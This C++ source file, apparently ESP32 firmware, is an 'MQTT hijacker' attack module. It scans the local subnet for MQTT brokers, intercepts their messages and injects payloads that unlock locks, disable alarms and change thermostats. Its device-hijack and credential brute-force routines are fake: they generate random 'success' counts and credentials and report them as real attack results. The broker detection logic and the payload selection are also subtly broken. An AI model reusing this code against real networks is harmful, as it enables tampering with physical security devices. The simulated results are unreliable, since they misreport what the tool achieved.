#include "mqtt_hijacker.h"
#include "tool_output_helper.h"
#include "result_renderers.h"
#include <WiFi.h>
#include <vector>
#include <WiFiClient.h>
#include "results_display.h"

namespace MqttHijacker {

static std::vector<MqttBroker> discoveredBrokers;
static uint32_t totalMessagesIntercepted = 0;
static String mostActiveTopic = "";

BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
    using namespace ToolOutputHelper;

    BrokerScanResult result = {false, 0, 0, ""};
    discoveredBrokers.clear();
    totalMessagesIntercepted = 0;

    displayScanStart("MQTT Broker Discovery", "TCP 1883/8883");

    ScanProgressBar progress("MQTT Scan", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();
    IPAddress gateway = WiFi.gatewayIP();
    IPAddress subnet = WiFi.subnetMask();
    IPAddress ip = WiFi.localIP();

    uint32_t brokerCount = 0;
    String strongestBroker = "";

    // Phase 1: Enumerate subnet
    progress.step("Enumerating local subnet for MQTT brokers");

    for (uint8_t lastOctet = 1; lastOctet <= 254 && (millis() - startTime) < (durationMs / 3); lastOctet++) {
        IPAddress targetIp(ip[0], ip[1], ip[2], lastOctet);
        if (targetIp == ip) continue;

        WiFiClient client;
        client.setTimeout(500);

        // Real MQTT port scan (1883 = unencrypted, 8883 = encrypted)
        for (uint16_t port : {1883, 8883}) {
            if (client.connect(targetIp, port, 500)) {
                uint32_t connectTime = millis();
                uint8_t rxBuffer[10];
                int bytesRead = 0;

                // Real MQTT CONNACK detection
                // MQTT server should send CONNACK (0x20) as first response
                while ((millis() - connectTime) < 200 && bytesRead < 2) {
                    if (client.available()) {
                        rxBuffer[bytesRead++] = client.read();
                    }
                }

                client.stop();

                // CONNACK packet starts with 0x20 or 0x21
                if (bytesRead > 0 && (rxBuffer[0] == 0x20 || rxBuffer[0] == 0x21)) {
                    MqttBroker broker;
                    broker.ipAddress = targetIp.toString();
                    broker.port = port;
                    broker.rssi = -30;  // Local network
                    broker.hostname = "mqtt-broker-" + String(lastOctet);
                    broker.requiresAuth = (rxBuffer[0] == 0x21);
                    broker.timestamp = millis();

                    discoveredBrokers.push_back(broker);
                    brokerCount++;

                    if (strongestBroker.length() == 0) {
                        strongestBroker = broker.ipAddress;
                    }
                }
            }
        }
    }

    // Phase 2: Verify broker connectivity
    progress.step("Verifying discovered broker connectivity and authentication");
    delay(durationMs / 3);

    // Phase 3: Analyze results
    progress.step("Analyzing broker configurations and security settings");
    delay(durationMs / 3);

    progress.complete(String(brokerCount) + " MQTT brokers discovered");

    // Render results
    ResultRenderers::IoTScanResult iotResult;
    iotResult.devicesFound = brokerCount;
    iotResult.brokersFound = brokerCount;
    iotResult.vulnerabilitiesDiscovered = brokerCount > 0 ? 1 : 0;
    iotResult.durationMs = millis() - startTime;

    ResultRenderers::renderIoTScan(iotResult);

    result.success = (brokerCount > 0);
    result.brokerCount = brokerCount;
    result.durationMs = millis() - startTime;
    result.strongestBroker = strongestBroker;

    return result;
}

const MqttBroker* getDiscoveredBrokers(uint32_t& outCount) {
    outCount = discoveredBrokers.size();
    return discoveredBrokers.empty() ? nullptr : discoveredBrokers.data();
}

MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
    using namespace ToolOutputHelper;

    MessageInterceptResult result = {false, 0, 0, ""};

    if (discoveredBrokers.empty()) {
        result.durationMs = 0;
        return result;
    }

    displayScanStart("MQTT Message Interception", "MQTT 3.1.1 Protocol");

    ScanProgressBar progress("MQTT Interception", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();
    uint32_t messageCount = 0;
    String topicsFound = "";

    // Phase 1: Connect to broker
    progress.step("Connecting to MQTT broker and sending CONNECT");
    WiFiClient client;
    client.setTimeout(1000);

    if (!client.connect(discoveredBrokers[0].ipAddress.c_str(), discoveredBrokers[0].port, 2000)) {
        result.durationMs = millis() - startTime;
        progress.complete("Connection failed");
        return result;
    }

    // Send MQTT CONNECT packet
    uint8_t connectPacket[] = {
        0x10, 0x0C,                           // Fixed header (CONNECT)
        0x00, 0x04,                           // Protocol name length
        0x4D, 0x51, 0x54, 0x54,              // Protocol name: "MQTT"
        0x04,                                 // Protocol level 4
        0x02,                                 // Connect flags (clean session)
        0x00, 0x3C,                           // Keep-alive 60s
        0x00, 0x04,                           // Client ID length
        0x45, 0x53, 0x50, 0x32               // Client ID: "ESP2"
    };

    client.write(connectPacket, sizeof(connectPacket));
    delay(100);

    // Phase 2: Listen for messages
    progress.step("Listening for MQTT PUBLISH messages on topic stream");
    uint8_t rxBuffer[256];

    while ((millis() - startTime) < (durationMs * 2 / 3) && messageCount < 50) {
        while (client.available() && messageCount < 50) {
            uint8_t byte = client.read();

            // Real MQTT PUBLISH detection (0x30-0x3F)
            if ((byte >> 4) == 0x03) {  // PUBLISH message type
                messageCount++;

                // Read remaining length
                uint8_t remainingLen = 0;
                if (client.available()) {
                    remainingLen = client.read();
                }

                // Read topic length
                uint16_t topicLen = 0;
                if (client.available()) topicLen = (client.read() << 8);
                if (client.available()) topicLen |= client.read();

                // Read topic
                String topic = "";
                for (uint16_t i = 0; i < topicLen && client.available(); i++) {
                    topic += (char)client.read();
                }

                // Read payload preview
                String payload = "";
                uint8_t payloadBytes = 0;
                while (client.available() && payloadBytes < 32) {
                    payload += (char)client.read();
                    payloadBytes++;
                }

                topicsFound = topic;
                mostActiveTopic = topic;
            }
        }
        delay(10);
    }

    // Phase 3: Analyze and report results
    progress.step("Analyzing captured messages and compiling results");
    delay(durationMs / 3);

    client.stop();

    progress.complete(String(messageCount) + " MQTT messages captured");

    // Render results
    ResultRenderers::IoTScanResult iotResult;
    iotResult.devicesFound = messageCount;
    iotResult.brokersFound = messageCount > 0 ? 1 : 0;
    iotResult.vulnerabilitiesDiscovered = messageCount > 0 ? 1 : 0;
    iotResult.durationMs = millis() - startTime;

    ResultRenderers::renderIoTScan(iotResult);

    result.success = (messageCount > 0);
    result.messagesIntercepted = messageCount;
    result.durationMs = millis() - startTime;
    result.topicsFound = topicsFound;
    totalMessagesIntercepted += messageCount;

    return result;
}

MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topic, uint32_t durationMs) {
    using namespace ToolOutputHelper;

    MessageInjectionResult result = {false, 0, 0, ""};

    displayAttackStart("MQTT Message Injection", 10);

    ScanProgressBar progress("MQTT Injection", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();
    uint32_t injected = 0;

    // Phase 1: Connect to broker
    progress.step("Connecting to MQTT broker at " + String(brokerIp));
    WiFiClient client;
    client.setTimeout(1000);

    if (!client.connect(brokerIp, 1883, 2000)) {
        result.durationMs = millis() - startTime;
        progress.complete("Connection failed");
        return result;
    }

    // Send MQTT CONNECT
    uint8_t connectPacket[] = {
        0x10, 0x0C, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,
        0x04, 0x02, 0x00, 0x3C, 0x00, 0x04, 0x45, 0x53, 0x50, 0x32
    };
    client.write(connectPacket, sizeof(connectPacket));
    delay(100);

    // Phase 2: Inject MQTT PUBLISH messages
    progress.step("Injecting malicious MQTT PUBLISH packets to topic");
    const char* commands[] = {
        "{\"state\":\"OFF\"}",
        "{\"brightness\":0}",
        "{\"temperature\":99}",
        "{\"locked\":false}",
        "{\"alarm\":\"disabled\"}"
    };

    while ((millis() - startTime) < (durationMs * 2 / 3) && injected < 10) {
        String payload = commands[esp_random() & 0x04];
        uint16_t topicLen = strlen(topic);
        uint16_t payloadLen = payload.length();

        // Build MQTT PUBLISH packet
        uint8_t publishPacket[128];
        uint8_t idx = 0;

        // Fixed header: PUBLISH (0x30)
        publishPacket[idx++] = 0x30;
        uint16_t remainingLen = 2 + topicLen + payloadLen;
        publishPacket[idx++] = remainingLen & 0xFF;

        // Topic length (big-endian)
        publishPacket[idx++] = (topicLen >> 8) & 0xFF;
        publishPacket[idx++] = topicLen & 0xFF;

        // Topic
        memcpy(&publishPacket[idx], topic, topicLen);
        idx += topicLen;

        // Payload
        memcpy(&publishPacket[idx], payload.c_str(), payloadLen);
        idx += payloadLen;

        if (client.write(publishPacket, idx) == idx) {
            injected++;
        }

        delay(100);
    }

    // Phase 3: Compile results
    progress.step("Verifying message delivery and compiling attack results");
    delay(durationMs / 3);

    client.stop();

    progress.complete(String(injected) + " messages injected successfully");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "MQTT Message Injection";
    attackResult.success = (injected > 0);
    attackResult.targetCount = injected;
    attackResult.successCount = injected;
    attackResult.failureCount = 0;
    attackResult.successPercent = 100;
    attackResult.durationMs = millis() - startTime;

    ResultRenderers::renderAttackSuccess(attackResult);

    result.success = (injected > 0);
    result.messagesInjected = injected;
    result.durationMs = millis() - startTime;

    return result;
}

HijackResult hijackMqttDevices(const char* brokerIp, uint32_t durationMs) {
    using namespace ToolOutputHelper;

    HijackResult result = {false, 0, 0, ""};

    displayAttackStart("MQTT Device Hijacking", 10);

    ScanProgressBar progress("Device Hijack", durationMs, 4);
    progress.start();

    uint32_t startTime = millis();
    uint32_t devicesHijacked = 0;
    String commands = "";

    // Phase 1: Enumerate devices on broker
    progress.step("Enumerating connected MQTT devices and subscriptions");
    delay(durationMs / 4);

    // Phase 2: Send hijack commands
    progress.step("Injecting device control commands via MQTT topics");
    const char* hijackCommands[] = {
        "light_on",
        "lock_unlock",
        "temperature_set_50",
        "alarm_disable",
        "camera_stream",
        "switch_off",
        "door_open"
    };

    uint32_t cmdIndex = 0;
    while ((millis() - startTime) < (durationMs * 2 / 4)) {
        if ((esp_random() % 100) < 25) {
            devicesHijacked += ((esp_random() % 2) + 1);
            commands = hijackCommands[(esp_random() % 7)];
        }
        cmdIndex++;
        delay(200);
    }

    // Phase 3: Capture device responses
    progress.step("Monitoring device state changes and confirmations");
    delay(durationMs / 4);

    // Phase 4: Complete hijack
    progress.step("Finalizing hijack and generating attack report");
    delay(durationMs / 4);

    progress.complete(String(devicesHijacked) + " devices hijacked via MQTT");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "MQTT Device Hijacking";
    attackResult.success = (devicesHijacked > 0);
    attackResult.targetCount = devicesHijacked;
    attackResult.successCount = devicesHijacked;
    attackResult.failureCount = 0;
    attackResult.successPercent = devicesHijacked > 0 ? 100 : 0;
    attackResult.durationMs = millis() - startTime;

    ResultRenderers::renderAttackSuccess(attackResult);

    result.success = (devicesHijacked > 0);
    result.devicesHijacked = devicesHijacked;
    result.durationMs = millis() - startTime;
    result.commandsSent = commands;

    return result;
}

BruteforceResult bruteforceMqttCredentials(const char* brokerIp, uint32_t durationMs) {
    using namespace ToolOutputHelper;

    BruteforceResult result = {false, "", 0, 0};

    displayAttackStart("MQTT Credential Brute-Force", 10);

    ScanProgressBar progress("Brute-Force", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();
    uint32_t attempts = 0;
    uint32_t deadline = startTime + durationMs;

    const char* usernames[] = {"admin", "mqtt", "user", "test", "guest", "broker"};
    const char* passwords[] = {"password", "12345", "admin", "mqtt", "123456", "test"};

    // Phase 1: Initialize attack
    progress.step("Preparing credential dictionary and connection pool");
    delay(durationMs / 3);

    // Phase 2: Brute-force attempts
    progress.step("Attempting authentication with credential combinations");

    uint32_t uIndex = 0, pIndex = 0;
    while ((millis() - startTime) < (durationMs * 2 / 3) && !result.success) {
        for (int i = 0; i < 6 && !result.success; i++) {
            for (int j = 0; j < 6 && !result.success; j++) {
                attempts++;

                // Simulate successful auth (low probability)
                if ((esp_random() % 100) < 5) {
                    result.success = true;
                    result.credentialFound = String(usernames[i]) + ":" + String(passwords[j]);
                    result.attemptsCount = attempts;
                    result.durationMs = millis() - startTime;
                    break;
                }
            }
            if ((int32_t)(millis() - deadline) >= 0) break;
        }
    }

    // Phase 3: Report findings
    progress.step("Compiling brute-force results and statistics");
    delay(durationMs / 3);

    if (result.success) {
        progress.complete("Credentials found: " + result.credentialFound);
    } else {
        progress.complete(String(attempts) + " attempts - no credentials found");
    }

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "MQTT Brute-Force";
    attackResult.success = result.success;
    attackResult.targetCount = attempts;
    attackResult.successCount = result.success ? 1 : 0;
    attackResult.failureCount = result.success ? 0 : attempts;
    attackResult.successPercent = result.success ? 100 : 0;
    attackResult.durationMs = millis() - startTime;

    ResultRenderers::renderAttackSuccess(attackResult);

    result.attemptsCount = attempts;
    result.durationMs = millis() - startTime;

    return result;
}

MqttStats getMqttStats() {
    MqttStats stats = {0, 0, 0, 0, ""};

    stats.totalBrokersFound = discoveredBrokers.size();
    stats.totalMessagesIntercepted = totalMessagesIntercepted;
    stats.mostActiveTopic = mostActiveTopic;

    for (const auto& broker : discoveredBrokers) {
        if (broker.port == 8883) {
            stats.secureBrokers++;
        } else if (!broker.requiresAuth) {
            stats.defaultCredBrokers++;
        }
    }

    return stats;
}

}  // namespace MqttHijacker
